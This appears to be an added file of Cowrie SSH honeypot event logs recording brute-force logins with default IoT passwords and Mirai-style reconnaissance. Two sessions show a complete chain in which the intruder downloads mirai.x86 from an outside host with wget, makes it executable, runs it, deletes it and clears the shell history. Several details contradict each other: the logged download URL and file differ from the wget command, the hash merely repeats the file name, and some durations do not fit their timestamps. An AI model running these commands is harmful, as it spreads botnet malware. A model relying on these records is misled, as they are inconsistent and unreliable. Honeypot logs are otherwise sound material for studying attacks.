+{"eventid":"cowrie.login.failed","session":"f70ded45d58e","src_ip":"203.0.113.44","timestamp":"2026-08-14T20:04:12.000Z","sensor":"honeypot","username":"support","password":"support"}
+{"eventid":"cowrie.login.failed","session":"f70ded45d58e","src_ip":"203.0.113.44","timestamp":"2026-08-14T20:04:13.000Z","sensor":"honeypot","username":"root","password":"12345"}
+{"eventid":"cowrie.login.failed","session":"f70ded45d58e","src_ip":"203.0.113.44","timestamp":"2026-08-14T20:04:14.000Z","sensor":"honeypot","username":"root","password":"klv123"}
+{"eventid":"cowrie.session.closed","session":"f70ded45d58e","src_ip":"203.0.113.44","timestamp":"2026-08-14T20:04:22.000Z","sensor":"honeypot","duration":40.01}
+{"eventid":"cowrie.session.connect","session":"9dbbdc19353b","src_ip":"192.0.2.77","timestamp":"2026-08-14T23:43:35.000Z","sensor":"honeypot","src_port":36423,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"9dbbdc19353b","src_ip":"192.0.2.77","timestamp":"2026-08-14T23:43:35.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.failed","session":"9dbbdc19353b","src_ip":"192.0.2.77","timestamp":"2026-08-14T23:43:36.000Z","sensor":"honeypot","username":"admin","password":"smcadmin"}
+{"eventid":"cowrie.login.failed","session":"9dbbdc19353b","src_ip":"192.0.2.77","timestamp":"2026-08-14T23:43:37.000Z","sensor":"honeypot","username":"root","password":"1111"}
+{"eventid":"cowrie.login.failed","session":"9dbbdc19353b","src_ip":"192.0.2.77","timestamp":"2026-08-14T23:43:38.000Z","sensor":"honeypot","username":"root","password":""}
+{"eventid":"cowrie.login.failed","session":"9dbbdc19353b","src_ip":"192.0.2.77","timestamp":"2026-08-14T23:43:39.000Z","sensor":"honeypot","username":"root","password":"vizxv"}
+{"eventid":"cowrie.login.failed","session":"9dbbdc19353b","src_ip":"192.0.2.77","timestamp":"2026-08-14T23:43:40.000Z","sensor":"honeypot","username":"root","password":"888888"}
+{"eventid":"cowrie.session.closed","session":"9dbbdc19353b","src_ip":"192.0.2.77","timestamp":"2026-08-14T23:43:58.000Z","sensor":"honeypot","duration":31.15}
+{"eventid":"cowrie.session.connect","session":"364457eb923b","src_ip":"198.51.100.140","timestamp":"2026-08-15T03:23:30.000Z","sensor":"honeypot","src_port":51693,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"364457eb923b","src_ip":"198.51.100.140","timestamp":"2026-08-15T03:23:30.120Z","sensor":"honeypot","version":"SSH-2.0-paramiko_2.7.2"}
+{"eventid":"cowrie.login.failed","session":"364457eb923b","src_ip":"198.51.100.140","timestamp":"2026-08-15T03:23:31.000Z","sensor":"honeypot","username":"root","password":"54321"}
+{"eventid":"cowrie.login.failed","session":"364457eb923b","src_ip":"198.51.100.140","timestamp":"2026-08-15T03:23:32.000Z","sensor":"honeypot","username":"root","password":"pass"}
+{"eventid":"cowrie.session.closed","session":"364457eb923b","src_ip":"198.51.100.140","timestamp":"2026-08-15T03:23:48.000Z","sensor":"honeypot","duration":8.87}
+{"eventid":"cowrie.session.connect","session":"700ae9152f60","src_ip":"203.0.113.201","timestamp":"2026-08-15T07:02:51.000Z","sensor":"honeypot","src_port":8071,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"700ae9152f60","src_ip":"203.0.113.201","timestamp":"2026-08-15T07:02:51.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.success","session":"700ae9152f60","src_ip":"203.0.113.201","timestamp":"2026-08-15T07:02:52.000Z","sensor":"honeypot","username":"root","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"700ae9152f60","src_ip":"203.0.113.201","timestamp":"2026-08-15T07:02:53.000Z","sensor":"honeypot","username":"ubnt","password":"ubnt"}
+{"eventid":"cowrie.login.failed","session":"700ae9152f60","src_ip":"203.0.113.201","timestamp":"2026-08-15T07:02:54.000Z","sensor":"honeypot","username":"root","password":"vizxv"}
+{"eventid":"cowrie.command.input","session":"700ae9152f60","src_ip":"203.0.113.201","timestamp":"2026-08-15T07:02:58.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"700ae9152f60","src_ip":"203.0.113.201","timestamp":"2026-08-15T07:03:00.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"700ae9152f60","src_ip":"203.0.113.201","timestamp":"2026-08-15T07:03:02.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"700ae9152f60","src_ip":"203.0.113.201","timestamp":"2026-08-15T07:03:06.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.session.closed","session":"700ae9152f60","src_ip":"203.0.113.201","timestamp":"2026-08-15T07:03:45.000Z","sensor":"honeypot","duration":29.85}
+{"eventid":"cowrie.session.connect","session":"4712045ce94e","src_ip":"198.51.100.87","timestamp":"2026-08-15T10:00:20.000Z","sensor":"honeypot","src_port":38310,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"4712045ce94e","src_ip":"198.51.100.87","timestamp":"2026-08-15T10:00:20.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.9.0"}
+{"eventid":"cowrie.login.failed","session":"4712045ce94e","src_ip":"198.51.100.87","timestamp":"2026-08-15T10:00:21.000Z","sensor":"honeypot","username":"admin","password":"smcadmin"}
+{"eventid":"cowrie.login.failed","session":"4712045ce94e","src_ip":"198.51.100.87","timestamp":"2026-08-15T10:00:22.000Z","sensor":"honeypot","username":"root","password":"juantech"}
+{"eventid":"cowrie.login.failed","session":"4712045ce94e","src_ip":"198.51.100.87","timestamp":"2026-08-15T10:00:23.000Z","sensor":"honeypot","username":"root","password":"1111"}
+{"eventid":"cowrie.session.closed","session":"4712045ce94e","src_ip":"198.51.100.87","timestamp":"2026-08-15T10:00:25.000Z","sensor":"honeypot","duration":10.21}
+{"eventid":"cowrie.session.connect","session":"43c4803ccd93","src_ip":"192.0.2.77","timestamp":"2026-08-15T11:29:54.000Z","sensor":"honeypot","src_port":36287,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"43c4803ccd93","src_ip":"192.0.2.77","timestamp":"2026-08-15T11:29:54.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"43c4803ccd93","src_ip":"192.0.2.77","timestamp":"2026-08-15T11:29:55.000Z","sensor":"honeypot","username":"admin","password":"smcadmin"}
+{"eventid":"cowrie.login.failed","session":"43c4803ccd93","src_ip":"192.0.2.77","timestamp":"2026-08-15T11:29:56.000Z","sensor":"honeypot","username":"user","password":"user"}
+{"eventid":"cowrie.login.failed","session":"43c4803ccd93","src_ip":"192.0.2.77","timestamp":"2026-08-15T11:29:57.000Z","sensor":"honeypot","username":"support","password":"support"}
+{"eventid":"cowrie.session.closed","session":"43c4803ccd93","src_ip":"192.0.2.77","timestamp":"2026-08-15T11:30:02.000Z","sensor":"honeypot","duration":20.78}
+{"eventid":"cowrie.session.connect","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:06.000Z","sensor":"honeypot","src_port":50630,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:06.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:07.000Z","sensor":"honeypot","username":"support","password":"support"}
+{"eventid":"cowrie.login.success","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:08.000Z","sensor":"honeypot","username":"root","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:09.000Z","sensor":"honeypot","username":"root","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:10.000Z","sensor":"honeypot","username":"root","password":"888888"}
+{"eventid":"cowrie.login.failed","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:11.000Z","sensor":"honeypot","username":"root","password":"54321"}
+{"eventid":"cowrie.login.failed","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:12.000Z","sensor":"honeypot","username":"ubnt","password":"ubnt"}
+{"eventid":"cowrie.command.input","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:12.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:14.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:17.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:20.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.command.input","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:21.000Z","sensor":"honeypot","input":"free -m"}
+{"eventid":"cowrie.session.closed","session":"14b0f32bb235","src_ip":"198.51.100.87","timestamp":"2026-08-15T11:41:33.000Z","sensor":"honeypot","duration":28.83}
+{"eventid":"cowrie.session.connect","session":"80a468aa8e38","src_ip":"192.0.2.77","timestamp":"2026-08-15T13:33:22.000Z","sensor":"honeypot","src_port":29191,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"80a468aa8e38","src_ip":"192.0.2.77","timestamp":"2026-08-15T13:33:22.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.10.0"}
+{"eventid":"cowrie.login.failed","session":"80a468aa8e38","src_ip":"192.0.2.77","timestamp":"2026-08-15T13:33:23.000Z","sensor":"honeypot","username":"root","password":"juantech"}
+{"eventid":"cowrie.login.failed","session":"80a468aa8e38","src_ip":"192.0.2.77","timestamp":"2026-08-15T13:33:24.000Z","sensor":"honeypot","username":"root","password":"12345"}
+{"eventid":"cowrie.login.failed","session":"80a468aa8e38","src_ip":"192.0.2.77","timestamp":"2026-08-15T13:33:25.000Z","sensor":"honeypot","username":"pi","password":"raspberry"}
+{"eventid":"cowrie.session.closed","session":"80a468aa8e38","src_ip":"192.0.2.77","timestamp":"2026-08-15T13:33:40.000Z","sensor":"honeypot","duration":40.9}
+{"eventid":"cowrie.session.connect","session":"5d58d1b2aaaa","src_ip":"198.51.100.140","timestamp":"2026-08-15T14:56:54.000Z","sensor":"honeypot","src_port":35358,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"5d58d1b2aaaa","src_ip":"198.51.100.140","timestamp":"2026-08-15T14:56:54.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"5d58d1b2aaaa","src_ip":"198.51.100.140","timestamp":"2026-08-15T14:56:55.000Z","sensor":"honeypot","username":"user","password":"user"}
+{"eventid":"cowrie.login.failed","session":"5d58d1b2aaaa","src_ip":"198.51.100.140","timestamp":"2026-08-15T14:56:56.000Z","sensor":"honeypot","username":"root","password":"888888"}
+{"eventid":"cowrie.login.failed","session":"5d58d1b2aaaa","src_ip":"198.51.100.140","timestamp":"2026-08-15T14:56:57.000Z","sensor":"honeypot","username":"root","password":""}
+{"eventid":"cowrie.login.failed","session":"5d58d1b2aaaa","src_ip":"198.51.100.140","timestamp":"2026-08-15T14:56:58.000Z","sensor":"honeypot","username":"root","password":"default"}
+{"eventid":"cowrie.session.closed","session":"5d58d1b2aaaa","src_ip":"198.51.100.140","timestamp":"2026-08-15T14:57:13.000Z","sensor":"honeypot","duration":20.58}
+{"eventid":"cowrie.session.connect","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:34:44.000Z","sensor":"honeypot","src_port":4485,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:34:44.120Z","sensor":"honeypot","version":"SSH-2.0-paramiko_2.7.2"}
+{"eventid":"cowrie.login.failed","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:34:45.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.login.failed","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:34:46.000Z","sensor":"honeypot","username":"root","password":"juantech"}
+{"eventid":"cowrie.login.success","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:34:47.000Z","sensor":"honeypot","username":"root","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:34:48.000Z","sensor":"honeypot","username":"support","password":"support"}
+{"eventid":"cowrie.login.failed","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:34:49.000Z","sensor":"honeypot","username":"admin","password":"smcadmin"}
+{"eventid":"cowrie.command.input","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:34:52.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:34:55.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:34:57.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:35:00.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.command.input","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:35:04.000Z","sensor":"honeypot","input":"free -m"}
+{"eventid":"cowrie.command.input","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:35:06.000Z","sensor":"honeypot","input":"wget http://198.51.100.250/bins/mirai.x86 -O /tmp/.x"}
+{"eventid":"cowrie.session.file_download","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:35:06.800Z","sensor":"honeypot","url":"http://203.0.113.201/a/kaiten.arm7","outfile":"var/lib/cowrie/downloads/9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5","shasum":"9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5"}
+{"eventid":"cowrie.command.input","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:35:08.000Z","sensor":"honeypot","input":"chmod +x /tmp/.x"}
+{"eventid":"cowrie.command.input","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:35:11.000Z","sensor":"honeypot","input":"/tmp/.x"}
+{"eventid":"cowrie.command.input","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:35:14.000Z","sensor":"honeypot","input":"rm -rf /tmp/.x"}
+{"eventid":"cowrie.command.input","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:35:15.000Z","sensor":"honeypot","input":"history -c"}
+{"eventid":"cowrie.session.closed","session":"92e3839c3b9f","src_ip":"203.0.113.9","timestamp":"2026-08-15T16:35:40.000Z","sensor":"honeypot","duration":21.05}
+{"eventid":"cowrie.session.connect","session":"f58da020a0b2","src_ip":"203.0.113.44","timestamp":"2026-08-15T19:07:41.000Z","sensor":"honeypot","src_port":16191,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"f58da020a0b2","src_ip":"203.0.113.44","timestamp":"2026-08-15T19:07:41.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.10.0"}
+{"eventid":"cowrie.login.failed","session":"f58da020a0b2","src_ip":"203.0.113.44","timestamp":"2026-08-15T19:07:42.000Z","sensor":"honeypot","username":"root","password":"54321"}
+{"eventid":"cowrie.login.failed","session":"f58da020a0b2","src_ip":"203.0.113.44","timestamp":"2026-08-15T19:07:43.000Z","sensor":"honeypot","username":"root","password":"pass"}
+{"eventid":"cowrie.login.failed","session":"f58da020a0b2","src_ip":"203.0.113.44","timestamp":"2026-08-15T19:07:44.000Z","sensor":"honeypot","username":"support","password":"support"}
+{"eventid":"cowrie.login.failed","session":"f58da020a0b2","src_ip":"203.0.113.44","timestamp":"2026-08-15T19:07:45.000Z","sensor":"honeypot","username":"root","password":"123456"}
+{"eventid":"cowrie.login.failed","session":"f58da020a0b2","src_ip":"203.0.113.44","timestamp":"2026-08-15T19:07:46.000Z","sensor":"honeypot","username":"root","password":"888888"}
+{"eventid":"cowrie.login.failed","session":"f58da020a0b2","src_ip":"203.0.113.44","timestamp":"2026-08-15T19:07:47.000Z","sensor":"honeypot","username":"root","password":"12345"}
+{"eventid":"cowrie.session.closed","session":"f58da020a0b2","src_ip":"203.0.113.44","timestamp":"2026-08-15T19:08:18.000Z","sensor":"honeypot","duration":39.11}
+{"eventid":"cowrie.session.connect","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:51:59.000Z","sensor":"honeypot","src_port":45343,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:51:59.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.success","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:00.000Z","sensor":"honeypot","username":"root","password":"root"}
+{"eventid":"cowrie.command.input","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:05.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:08.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:09.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:11.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.command.input","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:12.000Z","sensor":"honeypot","input":"free -m"}
+{"eventid":"cowrie.command.input","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:14.000Z","sensor":"honeypot","input":"wget http://198.51.100.250/bins/mirai.x86 -O /tmp/.x"}
+{"eventid":"cowrie.session.file_download","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:14.800Z","sensor":"honeypot","url":"http://203.0.113.201/a/kaiten.arm7","outfile":"var/lib/cowrie/downloads/9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5","shasum":"9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5"}
+{"eventid":"cowrie.command.input","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:16.000Z","sensor":"honeypot","input":"chmod +x /tmp/.x"}
+{"eventid":"cowrie.command.input","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:19.000Z","sensor":"honeypot","input":"/tmp/.x"}
+{"eventid":"cowrie.command.input","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:23.000Z","sensor":"honeypot","input":"rm -rf /tmp/.x"}
+{"eventid":"cowrie.command.input","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:25.000Z","sensor":"honeypot","input":"history -c"}
+{"eventid":"cowrie.session.closed","session":"83960c93bef8","src_ip":"198.51.100.140","timestamp":"2026-08-15T21:52:41.000Z","sensor":"honeypot","duration":10.76}
+{"eventid":"cowrie.session.connect","session":"b3bd88beef68","src_ip":"198.51.100.23","timestamp":"2026-08-15T22:43:01.000Z","sensor":"honeypot","src_port":33179,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"b3bd88beef68","src_ip":"198.51.100.23","timestamp":"2026-08-15T22:43:01.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"b3bd88beef68","src_ip":"198.51.100.23","timestamp":"2026-08-15T22:43:02.000Z","sensor":"honeypot","username":"pi","password":"raspberry"}
+{"eventid":"cowrie.session.closed","session":"b3bd88beef68","src_ip":"198.51.100.23","timestamp":"2026-08-15T22:43:22.000Z","sensor":"honeypot","duration":6.31}
+{"eventid":"cowrie.session.connect","session":"e9c20947db96","src_ip":"192.0.2.15","timestamp":"2026-08-15T23:56:31.000Z","sensor":"honeypot","src_port":28466,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"e9c20947db96","src_ip":"192.0.2.15","timestamp":"2026-08-15T23:56:31.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"e9c20947db96","src_ip":"192.0.2.15","timestamp":"2026-08-15T23:56:32.000Z","sensor":"honeypot","username":"root","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"e9c20947db96","src_ip":"192.0.2.15","timestamp":"2026-08-15T23:56:33.000Z","sensor":"honeypot","username":"root","password":"54321"}
+{"eventid":"cowrie.login.failed","session":"e9c20947db96","src_ip":"192.0.2.15","timestamp":"2026-08-15T23:56:34.000Z","sensor":"honeypot","username":"root","password":"default"}
+{"eventid":"cowrie.session.closed","session":"e9c20947db96","src_ip":"192.0.2.15","timestamp":"2026-08-15T23:56:41.000Z","sensor":"honeypot","duration":22.1}
+{"eventid":"cowrie.session.connect","session":"0be184d2a8f7","src_ip":"198.51.100.140","timestamp":"2026-08-16T01:54:52.000Z","sensor":"honeypot","src_port":60352,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"0be184d2a8f7","src_ip":"198.51.100.140","timestamp":"2026-08-16T01:54:52.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.failed","session":"0be184d2a8f7","src_ip":"198.51.100.140","timestamp":"2026-08-16T01:54:53.000Z","sensor":"honeypot","username":"root","password":"default"}
+{"eventid":"cowrie.login.failed","session":"0be184d2a8f7","src_ip":"198.51.100.140","timestamp":"2026-08-16T01:54:54.000Z","sensor":"honeypot","username":"admin","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"0be184d2a8f7","src_ip":"198.51.100.140","timestamp":"2026-08-16T01:54:55.000Z","sensor":"honeypot","username":"root","password":"pass"}
+{"eventid":"cowrie.login.failed","session":"0be184d2a8f7","src_ip":"198.51.100.140","timestamp":"2026-08-16T01:54:56.000Z","sensor":"honeypot","username":"root","password":"juantech"}
+{"eventid":"cowrie.login.success","session":"0be184d2a8f7","src_ip":"198.51.100.140","timestamp":"2026-08-16T01:54:57.000Z","sensor":"honeypot","username":"root","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"0be184d2a8f7","src_ip":"198.51.100.140","timestamp":"2026-08-16T01:54:58.000Z","sensor":"honeypot","username":"ubnt","password":"ubnt"}
+{"eventid":"cowrie.session.closed","session":"0be184d2a8f7","src_ip":"198.51.100.140","timestamp":"2026-08-16T01:55:10.000Z","sensor":"honeypot","duration":5.85}
+{"eventid":"cowrie.session.connect","session":"b042826cac45","src_ip":"192.0.2.200","timestamp":"2026-08-16T02:10:06.000Z","sensor":"honeypot","src_port":30692,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"b042826cac45","src_ip":"192.0.2.200","timestamp":"2026-08-16T02:10:06.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.failed","session":"b042826cac45","src_ip":"192.0.2.200","timestamp":"2026-08-16T02:10:07.000Z","sensor":"honeypot","username":"root","password":"1111"}
+{"eventid":"cowrie.session.closed","session":"b042826cac45","src_ip":"192.0.2.200","timestamp":"2026-08-16T02:10:14.000Z","sensor":"honeypot","duration":5.22}
+{"eventid":"cowrie.session.connect","session":"6c9e9f9b47f8","src_ip":"198.51.100.87","timestamp":"2026-08-16T04:14:58.000Z","sensor":"honeypot","src_port":51656,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"6c9e9f9b47f8","src_ip":"198.51.100.87","timestamp":"2026-08-16T04:14:58.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.failed","session":"6c9e9f9b47f8","src_ip":"198.51.100.87","timestamp":"2026-08-16T04:14:59.000Z","sensor":"honeypot","username":"user","password":"user"}
+{"eventid":"cowrie.login.failed","session":"6c9e9f9b47f8","src_ip":"198.51.100.87","timestamp":"2026-08-16T04:15:00.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.login.failed","session":"6c9e9f9b47f8","src_ip":"198.51.100.87","timestamp":"2026-08-16T04:15:01.000Z","sensor":"honeypot","username":"root","password":"54321"}
+{"eventid":"cowrie.login.failed","session":"6c9e9f9b47f8","src_ip":"198.51.100.87","timestamp":"2026-08-16T04:15:02.000Z","sensor":"honeypot","username":"pi","password":"raspberry"}
+{"eventid":"cowrie.login.failed","session":"6c9e9f9b47f8","src_ip":"198.51.100.87","timestamp":"2026-08-16T04:15:03.000Z","sensor":"honeypot","username":"root","password":"12345"}
+{"eventid":"cowrie.login.failed","session":"6c9e9f9b47f8","src_ip":"198.51.100.87","timestamp":"2026-08-16T04:15:04.000Z","sensor":"honeypot","username":"admin","password":"smcadmin"}
+{"eventid":"cowrie.session.closed","session":"6c9e9f9b47f8","src_ip":"198.51.100.87","timestamp":"2026-08-16T04:15:05.000Z","sensor":"honeypot","duration":15.41}
+{"eventid":"cowrie.session.connect","session":"0ff8d69755f0","src_ip":"203.0.113.44","timestamp":"2026-08-16T04:18:06.000Z","sensor":"honeypot","src_port":7400,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"0ff8d69755f0","src_ip":"203.0.113.44","timestamp":"2026-08-16T04:18:06.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"0ff8d69755f0","src_ip":"203.0.113.44","timestamp":"2026-08-16T04:18:07.000Z","sensor":"honeypot","username":"root","password":"klv123"}
+{"eventid":"cowrie.login.failed","session":"0ff8d69755f0","src_ip":"203.0.113.44","timestamp":"2026-08-16T04:18:08.000Z","sensor":"honeypot","username":"ubnt","password":"ubnt"}
+{"eventid":"cowrie.session.closed","session":"0ff8d69755f0","src_ip":"203.0.113.44","timestamp":"2026-08-16T04:18:25.000Z","sensor":"honeypot","duration":23.97}
+{"eventid":"cowrie.session.connect","session":"492a8b672fb9","src_ip":"192.0.2.15","timestamp":"2026-08-16T06:42:17.000Z","sensor":"honeypot","src_port":64652,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"492a8b672fb9","src_ip":"192.0.2.15","timestamp":"2026-08-16T06:42:17.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"492a8b672fb9","src_ip":"192.0.2.15","timestamp":"2026-08-16T06:42:18.000Z","sensor":"honeypot","username":"root","password":"54321"}
+{"eventid":"cowrie.session.closed","session":"492a8b672fb9","src_ip":"192.0.2.15","timestamp":"2026-08-16T06:42:46.000Z","sensor":"honeypot","duration":24.65}
+{"eventid":"cowrie.session.connect","session":"2c23f3756596","src_ip":"192.0.2.15","timestamp":"2026-08-16T08:52:44.000Z","sensor":"honeypot","src_port":17131,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"2c23f3756596","src_ip":"192.0.2.15","timestamp":"2026-08-16T08:52:44.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"2c23f3756596","src_ip":"192.0.2.15","timestamp":"2026-08-16T08:52:45.000Z","sensor":"honeypot","username":"ubnt","password":"ubnt"}
+{"eventid":"cowrie.login.failed","session":"2c23f3756596","src_ip":"192.0.2.15","timestamp":"2026-08-16T08:52:46.000Z","sensor":"honeypot","username":"admin","password":"smcadmin"}
+{"eventid":"cowrie.login.failed","session":"2c23f3756596","src_ip":"192.0.2.15","timestamp":"2026-08-16T08:52:47.000Z","sensor":"honeypot","username":"root","password":""}
+{"eventid":"cowrie.login.failed","session":"2c23f3756596","src_ip":"192.0.2.15","timestamp":"2026-08-16T08:52:48.000Z","sensor":"honeypot","username":"pi","password":"raspberry"}
+{"eventid":"cowrie.login.failed","session":"2c23f3756596","src_ip":"192.0.2.15","timestamp":"2026-08-16T08:52:49.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.session.closed","session":"2c23f3756596","src_ip":"192.0.2.15","timestamp":"2026-08-16T08:53:00.000Z","sensor":"honeypot","duration":25.45}
